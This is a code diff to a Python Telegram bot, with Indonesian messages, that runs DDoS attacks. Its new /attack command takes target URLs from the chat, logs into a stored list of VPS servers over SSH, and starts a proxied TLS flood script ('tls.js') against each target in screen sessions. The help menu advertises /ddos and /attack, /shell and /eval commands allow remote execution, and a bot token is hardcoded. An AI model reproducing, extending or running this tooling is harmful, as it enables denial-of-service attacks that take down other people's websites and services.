@@ -3,6 +3,13 @@ import paramiko
 import json
 import os
 import subprocess
+import time
+import time
+import subprocess
+import validators
+from pyrogram import Client, filters
+from pyrogram.types import Message
+
 
 BOT_TOKEN = "7881482388:AAGp8gYPg6CJh_iXNtuGYeEin7EF0UpAOlg"
 API_ID = 26323194          
@@ -130,6 +137,63 @@ def create_new_screen_and_run_command(host, port, username, password, command):
 app = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)
 
 
+tls_script = "tls.js"
+proxy_file = "proxy.txt"
+
+if not os.path.isfile(tls_script):
+    raise FileNotFoundError(f"Error: File {tls_script} tidak ditemukan.")
+
+if not os.path.isfile(proxy_file):
+    raise FileNotFoundError(f"Error: File {proxy_file} tidak ditemukan.")
+
+
+@app.on_message(filters.command("attack") & filters.private)
+async def run_attack_script(client: Client, message: Message):
+    await message.reply("Masukkan URL atau beberapa URL (pisahkan dengan koma):")
+
+    user_input = await app.listen(message.chat.id)
+    urls = [url.strip() for url in user_input.text.split(",")] 
+    valid_urls = []
+    for url in urls:
+        if validators.url(url):
+            valid_urls.append(url)
+        else:
+            await message.reply(f"[SKIP] URL tidak valid: {url}")
+
+    if not valid_urls:
+        await message.reply("Tidak ada URL yang valid. Program dihentikan.")
+        return
+
+    vps_list = load_vps()
+
+    if not vps_list:
+        await message.reply("Tidak ada VPS yang terdaftar.")
+        return
+
+    try:
+        for vps in vps_list:
+            host = vps['host']
+            port = vps['port']
+            username = vps['username']
+            password = vps['password']
+
+            for url in valid_urls:
+                session_name = f"attack_{url.replace('http://', '').replace('https://', '').replace('/', '_')}"
+                command = f"node {tls_script} {url} 600 64 10 {proxy_file}"
+
+                if is_screen_session_active(host, port, username, password, session_name):
+                    result_message = execute_ssh_command(host, port, username, password, f"screen -S {session_name} -X stuff '{command}\n'")
+                    await message.reply(f"[INFO] Menjalankan perintah di screen aktif: {session_name}\n{result_message}")
+                else:
+                    result_message = create_new_screen_and_run_command(host, port, username, password, command)
+                    await message.reply(f"[INFO] Screen baru dibuat untuk URL: {url} di VPS {host}\n{result_message}")
+
+                time.sleep(5)
+
+    except Exception as e:
+        return await message.reply(f"[FATAL] Kesalahan sistem: {e}")
+
+
 @app.on_message(filters.command("addvps"))
 async def add_vps(client, message):
     try:
@@ -245,7 +309,7 @@ async def shell(client, message):
         await message.reply(f"Hasil perintah di VPS {host}:{port}:\n{result}")
     
     except ValueError:
-        await message.reply("Gunakan format: /shell [host] [command]")
+        await message.reply("Gunakan format: /lihat [host] [command]")
 
 
 
@@ -301,15 +365,32 @@ async def eval_code(client, message):
         await message.reply("Gunakan format: /eval [code]")
 
 
-@app.on_message(filters.command("pink"))
-async def pink(client, message):
-    pinkss = """
-/ddos command nya apa ? tanya noh sama @boyypd
-ga suka ribet, simple aja!!
-DDOS BY www.sukap.ink
-"""
+# @app.on_message(filters.command("help"))
+# async def help(client, message):
+#     helpss = """
+# /addvps tambah vps
+# /listvps daftar vps
+# /delvps hapus vps
+# /ddos ya ddos
+# /attack ya attack
 
-    return await message.reply(pinkss)
 
 
-app.run()
+# """
+@app.on_message(filters.command("help"))
+async def help(client, message):
+    helpss = (
+        "<b>📜 Help Menu:</b>\n\n"
+        "/addvps - Tambah VPS\n"
+        "/listvps - Daftar VPS\n"
+        "/delvps - Hapus VPS\n"
+        "/ddos - Ya DDOS\n"
+        "/attack - Ya Attack\n"
+    )
+
+    return await message.reply(helpss)
+
+
+if __name__ == "__main__":
+    print("Bot sudah berjalan... Kirimkan perintah ke bot untuk memulai.")
+    app.run()
